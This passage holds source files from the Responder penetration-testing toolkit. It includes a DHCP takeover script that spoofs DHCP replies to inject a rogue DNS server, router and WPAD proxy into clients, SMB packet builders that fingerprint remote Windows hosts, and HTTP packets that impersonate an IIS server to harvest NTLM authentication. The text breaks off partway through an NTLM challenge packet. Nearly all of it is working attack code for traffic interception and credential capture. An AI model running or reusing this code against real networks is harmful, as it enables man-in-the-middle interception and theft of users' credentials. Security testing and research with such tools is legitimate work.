__FILENAME__ = DHCP
#! /usr/bin/env python
# This utility is part of NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
import sys,struct,socket,re,optparse,ConfigParser,os
from odict import OrderedDict
from socket import inet_aton, inet_ntoa


parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -d pwned.com -p 10.20.30.40 -s 10.20.30.1 -r 10.20.40.1',
                               prog=sys.argv[0],
                               )
parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")

parser.add_option('-d', '--dnsname',action="store", help="DNS name to inject, if you don't want to inject a DNS server, provide the original one.", metavar="pwned.com", default="pwned.com",dest="DNSNAME")

parser.add_option('-r', '--router',action="store", help="The ip address of the router or yours if you want to intercept traffic.", metavar="10.20.1.1",dest="RouterIP")

parser.add_option('-p', '--primary',action="store", help="The ip address of the original primary DNS server or yours", metavar="10.20.1.10",dest="DNSIP")

parser.add_option('-s', '--secondary',action="store", help="The ip address of the original secondary DNS server or yours", metavar="10.20.1.11",dest="DNSIP2")

parser.add_option('-n', '--netmask',action="store", help="The netmask of this network", metavar="255.255.255.0", default="255.255.255.0", dest="Netmask")

parser.add_option('-I', '--interface',action="store", help="Interface name to use, example: eth0", metavar="eth0",dest="Interface")

parser.add_option('-w', '--wpadserver',action="store", help="Your WPAD server, finish the string with '\\n'", metavar="\"http://wpadsrv/wpad.dat\\n\"", default="\n", dest="WPAD")

parser.add_option('-S',action="store_true", help="Spoof the router ip address",dest="Spoof")

parser.add_option('-R',action="store_true", help="Respond to DHCP Requests, inject linux clients (very noisy, this is sent on 255.255.255.255)", dest="Request")

options, args = parser.parse_args()

def ShowWelcome():
    Message = 'DHCP INFORM Take Over 0.2\nAuthor: Laurent Gaffie\nPlease send bugs/comments/pcaps to: lgaffie@trustwave.com\nBy default, this script will only inject a new DNS/WPAD server to a Windows <= XP/2003 machine.\nTo inject a DNS server/domain/route on a Windows >= Vista and any linux box, use -R (can be noisy)\n\033[1m\033[31mUse Responder.conf\'s RespondTo setting for in-scope only targets\033[0m\n'
    print Message

if options.OURIP is None:
   print "\n\033[1m\033[31m-i mandatory option is missing, please provide your IP address.\033[0m\n"
   parser.print_help()
   exit(-1)

if options.Interface is None:
   print "\n\033[1m\033[31m-I mandatory option is missing, please provide an interface.\033[0m\n"
   parser.print_help()
   exit(-1)

if options.RouterIP is None:
   print "\n\033[1m\033[31m-r mandatory option is missing, please provide the router's IP.\033[0m\n"
   parser.print_help()
   exit(-1)

if options.DNSIP is None:
   print "\n\033[1m\033[31m-p mandatory option is missing, please provide the primary DNS server ip address or yours.\033[0m\n"
   parser.print_help()
   exit(-1)

if options.DNSIP2 is None:
   print "\n\033[1m\033[31m-s mandatory option is missing, please provide the secondary DNS server ip address or yours.\033[0m\n"
   parser.print_help()
   exit(-1)

ShowWelcome()

#Config parsing
ResponderPATH = os.path.dirname(__file__)
config = ConfigParser.ConfigParser()
config.read(os.path.join(ResponderPATH,'Responder.conf'))
RespondTo = config.get('Responder Core', 'RespondTo').strip()

#Setting some vars
Interface = options.Interface
OURIP = options.OURIP
ROUTERIP = options.RouterIP
NETMASK = options.Netmask
DHCPSERVER = options.OURIP
DNSIP = options.DNSIP
DNSIP2 = options.DNSIP2
DNSNAME = options.DNSNAME
WPADSRV = options.WPAD
Spoof = options.Spoof
Request = options.Request

if Spoof:
   DHCPSERVER = ROUTERIP

def SpoofIP(Spoof):
    if Spoof:
       return ROUTERIP
    else:
       return OURIP 

def RespondToSpecificHost(RespondTo):
    if len(RespondTo)>=1 and RespondTo != ['']:
       return True
    else:
       return False

def RespondToIPScope(RespondTo, ClientIp):
    if ClientIp in RespondTo:
       return True
    else:
       return False

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))


#####################################################################
# Server Stuff
#####################################################################

class IPHead(Packet):
    fields = OrderedDict([
        ("Version",           "\x45"),
        ("DiffServices",      "\x00"),
        ("TotalLen",          "\x00\x00"),
        ("Ident",             "\x00\x00"),
        ("Flags",             "\x00\x00"),
        ("TTL",               "\x40"),
        ("Protocol",          "\x11"),
        ("Checksum",          "\x00\x00"),
        ("SrcIP",             ""),
        ("DstIP",             ""),
    ])

class UDP(Packet):
    fields = OrderedDict([
        ("SrcPort",           "\x00\x43"),
        ("DstPort",           "\x00\x44"),
        ("Len",               "\x00\x00"),
        ("Checksum",          "\x00\x00"),
        ("Data",              "\x00\x00"),
    ])

    def calculate(self):
        self.fields["Len"] = struct.pack(">h",len(str(self.fields["Data"]))+8)##include udp packet.

class DHCPACK(Packet):
    fields = OrderedDict([
        ("MessType",          "\x02"),
        ("HdwType",           "\x01"),
        ("HdwLen",            "\x06"),
        ("Hops",              "\x00"),
        ("Tid",               "\x22\x1b\xe0\x1a"),
        ("ElapsedSec",        "\x00\x00"),
        ("BootpFlags",        "\x00\x00"),
        ("ActualClientIP",    "\x00\x00\x00\x00"),
        ("GiveClientIP",      "\x00\x00\x00\x00"),
        ("NextServerIP",      "\x00\x00\x00\x00"),
        ("RelayAgentIP",      "\x00\x00\x00\x00"),
        ("ClientMac",         "\xb8\x76\x3f\xbd\xdd\x05"),
        ("ClientMacPadding",  "\x00" *10),
        ("ServerHostname",    "\x00" * 64),
        ("BootFileName",      "\x00" * 128),
        ("MagicCookie",       "\x63\x82\x53\x63"),
        ("DHCPCode",          "\x35"),    #DHCP Message
        ("DHCPCodeLen",       "\x01"),
        ("DHCPOpCode",        "\x05"),    #Msgtype(ACK)
        ("Op54",              "\x36"),
        ("Op54Len",           "\x04"),
        ("Op54Str",           ""),                #DHCP Server
        ("Op51",              "\x33"),
        ("Op51Len",           "\x04"),
        ("Op51Str",           "\x00\x01\x51\x80"), #Lease time, 1 day.
        ("Op1",               "\x01"),
        ("Op1Len",            "\x04"),
        ("Op1Str",            ""),                  #Netmask
        ("Op15",              "\x0f"),
        ("Op15Len",           "\x0e"),
        ("Op15Str",           DNSNAME),             #DNS Name
        ("Op3",               "\x03"),
        ("Op3Len",            "\x04"),
        ("Op3Str",            ""),                  #Router
        ("Op6",               "\x06"),
        ("Op6Len",            "\x08"),
        ("Op6Str",            ""),                  #DNS Servers
        ("Op252",              "\xfc"),
        ("Op252Len",           "\x04"),
        ("Op252Str",           WPADSRV),            #Wpad Server.
        ("Op255",             "\xff"),
        ("Padding",           "\x00"),

    ])

    def calculate(self):
        self.fields["Op54Str"] = inet_aton(DHCPSERVER)
        self.fields["Op1Str"] = inet_aton(NETMASK)
        self.fields["Op3Str"] = inet_aton(ROUTERIP)
        self.fields["Op6Str"] = inet_aton(DNSIP)+inet_aton(DNSIP2)
        self.fields["Op15Len"] = struct.pack(">b",len(DNSNAME))
        self.fields["Op252Len"] = struct.pack(">b",len(WPADSRV))

class DHCPInformACK(Packet):
    fields = OrderedDict([
        ("MessType",          "\x02"),
        ("HdwType",           "\x01"),
        ("HdwLen",            "\x06"),
        ("Hops",              "\x00"),
        ("Tid",               "\x22\x1b\xe0\x1a"),
        ("ElapsedSec",        "\x00\x00"),
        ("BootpFlags",        "\x00\x00"),
        ("ActualClientIP",    "\x00\x00\x00\x00"),
        ("GiveClientIP",      "\x00\x00\x00\x00"),
        ("NextServerIP",      "\x00\x00\x00\x00"),
        ("RelayAgentIP",      "\x00\x00\x00\x00"),
        ("ClientMac",         "\xb8\x76\x3f\xbd\xdd\x05"),
        ("ClientMacPadding",  "\x00" *10),
        ("ServerHostname",    "\x00" * 64),
        ("BootFileName",      "\x00" * 128),
        ("MagicCookie",       "\x63\x82\x53\x63"),
        ("Op53",              "\x35\x01\x05"),      #Msgtype(ACK)
        ("Op54",              "\x36"),
        ("Op54Len",           "\x04"),
        ("Op54Str",           ""),                  #DHCP Server
        ("Op1",               "\x01"),
        ("Op1Len",            "\x04"),
        ("Op1Str",            ""),                  #Netmask
        ("Op15",              "\x0f"),
        ("Op15Len",           "\x0e"),
        ("Op15Str",           DNSNAME),             #DNS Name
        ("Op3",               "\x03"),
        ("Op3Len",            "\x04"),
        ("Op3Str",            ""),                  #Router
        ("Op6",               "\x06"),
        ("Op6Len",            "\x08"),
        ("Op6Str",            ""),                  #DNS Servers
        ("Op252",              "\xfc"),
        ("Op252Len",           "\x04"),
        ("Op252Str",           WPADSRV),            #Wpad Server.
        ("Op255",             "\xff"),

    ])

    def calculate(self):
        self.fields["Op54Str"] = inet_aton(DHCPSERVER)
        self.fields["Op1Str"] = inet_aton(NETMASK)
        self.fields["Op3Str"] = inet_aton(ROUTERIP)
        self.fields["Op6Str"] = inet_aton(DNSIP)+inet_aton(DNSIP2)
        self.fields["Op15Len"] = struct.pack(">b",len(DNSNAME))
        self.fields["Op252Len"] = struct.pack(">b",len(WPADSRV))

def ParseMac(data):
    return '\nDst mac:%s SrcMac:%s'%(data[0][0:6].encode('hex'),data[0][6:12].encode('hex'))

def IsUDP(data):
    if data[0][23:24] == "\x11":
       return True
    if data[0][23:24] == "\x06":
       return False

def ParseSrcDSTAddr(data):
     SrcIP = inet_ntoa(data[0][26:30])
     DstIP = inet_ntoa(data[0][30:34])
     SrcPort = struct.unpack('>H',data[0][34:36])[0]
     DstPort = struct.unpack('>H',data[0][36:38])[0]
     return SrcIP,SrcPort,DstIP,DstPort

def FindIP(data):
    IP = ''.join(re.findall('(?<=\x32\x04)[^EOF]*', data))
    return ''.join(IP[0:4])
    
def ParseDHCPCode(data):
    PTid = data[4:8]
    Seconds = data[8:10]
    CurrentIP = inet_ntoa(data[12:16])
    RequestedIP = inet_ntoa(data[16:20])
    MacAddr = data[28:34]
    OpCode = data[242:243]
    RequestIP = data[245:249]
    if OpCode == "\x08":
       i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=inet_aton(CurrentIP))
       p = DHCPInformACK(Tid=PTid,ClientMac=MacAddr, ActualClientIP=inet_aton(CurrentIP), GiveClientIP=inet_aton("0.0.0.0"), NextServerIP=inet_aton("0.0.0.0"),RelayAgentIP=inet_aton("0.0.0.0"),BootpFlags="\x00\x00",ElapsedSec=Seconds)
       p.calculate()
       u = UDP(Data = p)
       u.calculate()
       for x in range(1):
          SendDHCP(str(i)+str(u),(CurrentIP,68))
       return '\033[1m\033[31mDHCP Inform received:\033[0m Current IP:%s Requested IP:%s Mac Address:%s Tid:%s'%(CurrentIP,RequestedIP,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))

    if OpCode == "\x03":
       if Request:
          IP = FindIP(data)
          if IP:
             IPConv = inet_ntoa(IP)
             if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
                p.calculate()
                u = UDP(Data = p)
                u.calculate()
                for x in range(1):
                   SendDHCP(str(i)+str(u),(IPConv,68))
                return '\033[1m\033[31mIn-scope DHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
             if RespondToSpecificHost(RespondTo) == False:
                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
                p.calculate()
                u = UDP(Data = p)
                u.calculate()
                for x in range(1):
                   SendDHCP(str(i)+str(u),(IPConv,68))
                return '\033[1m\033[31mDHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))

    if OpCode == "\x01":
       if Request:
          IP = FindIP(data)
          if IP:
             IPConv = inet_ntoa(IP)
             if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
                p.calculate()
                u = UDP(Data = p)
                u.calculate()
                for x in range(1):
                   SendDHCP(str(i)+str(u),(IPConv,0))
                return '\033[1m\033[31mIn-scope DHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
             if RespondToSpecificHost(RespondTo) == False:
                i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
                p.calculate()
                u = UDP(Data = p)
                u.calculate()
                for x in range(1):
                   SendDHCP(str(i)+str(u),(IPConv,0))
                return '\033[1m\033[31mDHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))

    else:
       return False


def SendDHCP(packet,Host):
   Protocol = 0x0800
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
   s.sendto(packet, Host)

def SniffUDPMac():
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
    Protocol = 0x0800
    s.bind((Interface, Protocol))
    while True:
       data = s.recvfrom(65535)
       if IsUDP(data):
          SrcIP,SrcPort,DstIP,DstPort =  ParseSrcDSTAddr(data)
          if SrcPort == 67 or DstPort == 67:
             Message = ParseDHCPCode(data[0][42:])
             if Message:
                print 'DHCP Packet:\nSource IP/Port : %s:%s Destination IP/Port: %s:%s'%(SrcIP,SrcPort,DstIP,DstPort)
                print Message


SniffUDPMac()



########NEW FILE########
__FILENAME__ = Fingerprint
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import re,sys,socket,struct,string
from socket import *
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("error-code", "\x00\x00\x00\x00" ),
        ("flag1", "\x00"),
        ("flag2", "\x00\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x00\x00"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

class SMBNego(Packet):
    fields = OrderedDict([
        ("wordcount", "\x00"),
        ("bcc", "\x62\x00"),
        ("data", "")
    ])
    
    def calculate(self):
        self.fields["bcc"] = struct.pack("<h",len(str(self.fields["data"])))

class SMBNegoData(Packet):
    fields = OrderedDict([
        ("separator1","\x02" ),
        ("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("separator2","\x02"),
        ("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
        ("separator3","\x02"),
        ("dialect3", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00"),
        ("separator4","\x02"),
        ("dialect4", "\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"),
        ("separator5","\x02"),
        ("dialect5", "\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00"),
        ("separator6","\x02"),
        ("dialect6", "\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"),
    ])

class SMBSessionFingerData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\x00\x00"),
        ("maxbuff","\x04\x11"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x00\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x4a\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xd4\x00\x00\xa0"),
        ("bcc1",""),
        ("Data","\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x01\x28\x0a\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x33\x00\x20\x00\x32\x00\x36\x00\x30\x00\x30\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x00\x00"),

    ])
    def calculate(self): 
        self.fields["bcc1"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]   


def OsNameClientVersion(data):
    try:
       lenght = struct.unpack('<H',data[43:45])[0]
       pack = tuple(data[47+lenght:].split('\x00\x00\x00'))[:2]
       var = [e.replace('\x00','') for e in data[47+lenght:].split('\x00\x00\x00')[:2]]
       OsVersion, ClientVersion = tuple(var)
       return OsVersion, ClientVersion
    except:
       return "Could not fingerprint Os version.", "Could not fingerprint LanManager Client version"

def RunSmbFinger(host):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(host)
    s.settimeout(0.7)
    h = SMBHeader(cmd="\x72",flag1="\x18",flag2="\x53\xc8")
    n = SMBNego(data = SMBNegoData())
    n.calculate()
    packet0 = str(h)+str(n)
    buffer0 = longueur(packet0)+packet0
    s.send(buffer0)
    data = s.recv(2048)
    if data[8:10] == "\x72\x00":
       head = SMBHeader(cmd="\x73",flag1="\x18",flag2="\x17\xc8",uid="\x00\x00")
       t = SMBSessionFingerData()
       t.calculate()
       final = t 
       packet0 = str(head)+str(final)
       buffer1 = longueur(packet0)+packet0  
       s.send(buffer1) 
       data = s.recv(2048)
    if data[8:10] == "\x73\x16":
       return OsNameClientVersion(data)

########NEW FILE########
__FILENAME__ = FingerprintRelay
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import re,socket,struct
from socket import *
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("error-code", "\x00\x00\x00\x00" ),
        ("flag1", "\x00"),
        ("flag2", "\x00\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x00\x00"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

class SMBNego(Packet):
    fields = OrderedDict([
        ("wordcount", "\x00"),
        ("bcc", "\x62\x00"),
        ("data", "")
    ])
    
    def calculate(self):
        self.fields["bcc"] = struct.pack("<h",len(str(self.fields["data"])))

class SMBNegoData(Packet):
    fields = OrderedDict([
        ("separator1","\x02" ),
        ("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("separator2","\x02"),
        ("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
        ("separator3","\x02"),
        ("dialect3", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00"),
        ("separator4","\x02"),
        ("dialect4", "\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"),
        ("separator5","\x02"),
        ("dialect5", "\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00"),
        ("separator6","\x02"),
        ("dialect6", "\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"),
    ])

class SMBSessionFingerData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\x00\x00"),
        ("maxbuff","\x04\x11"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x00\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x4a\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xd4\x00\x00\xa0"),
        ("bcc1",""),
        ("Data","\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x01\x28\x0a\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x33\x00\x20\x00\x32\x00\x36\x00\x30\x00\x30\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x00\x00"),

    ])
    def calculate(self): 
        self.fields["bcc1"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]   


def OsNameClientVersion(data):
    lenght = struct.unpack('<H',data[43:45])[0]
    pack = tuple(data[47+lenght:].split('\x00\x00\x00'))[:2]
    var = [e.replace('\x00','') for e in data[47+lenght:].split('\x00\x00\x00')[:2]]
    OsVersion = tuple(var)[0]
    return OsVersion


def RunSmbFinger(host):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(host)
    s.settimeout(0.7)
    h = SMBHeader(cmd="\x72",flag1="\x18",flag2="\x53\xc8")
    n = SMBNego(data = SMBNegoData())
    n.calculate()
    packet0 = str(h)+str(n)
    buffer0 = longueur(packet0)+packet0
    s.send(buffer0)
    data = s.recv(2048)
    if data[8:10] == "\x72\x00":
       head = SMBHeader(cmd="\x73",flag1="\x18",flag2="\x17\xc8",uid="\x00\x00")
       t = SMBSessionFingerData()
       t.calculate()
       final = t 
       packet0 = str(head)+str(final)
       buffer1 = longueur(packet0)+packet0  
       s.send(buffer1) 
       data = s.recv(2048)
    if data[8:10] == "\x73\x16":
       return OsNameClientVersion(data)

########NEW FILE########
__FILENAME__ = HTTPPackets
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict
from base64 import b64decode,b64encode

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))


#HTTP Packet used for further NTLM auth.
class IIS_Auth_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

#HTTP Packet Granted auth.
class IIS_Auth_Granted(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

#HTTP NTLM Auth
class NTLM_Challenge(Packet):
    fields = OrderedDict([
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  ""),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),             
